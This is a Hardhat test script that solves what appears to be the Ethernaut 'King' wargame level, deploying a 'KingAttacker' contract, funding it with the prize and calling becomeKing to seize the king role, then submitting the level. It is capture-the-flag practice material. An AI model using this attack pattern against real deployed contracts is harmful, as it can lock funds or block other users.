import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`King`);
  const challengeAddress = await createChallenge(
    `0x5cECE66f3EB19f7Df3192Ae37C27D96D8396433D`,
    ethers.utils.parseUnits(`1`, `ether`)
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('KingAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy()

  console.log(await challenge._king())

  let requiredAmount = await challenge.prize() // 1 ETH
  await attacker.connect(eoa).provideFunds({value:requiredAmount})
  await attacker.connect(eoa).becomeKing(challenge.address)

  console.log(await challenge._king())

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
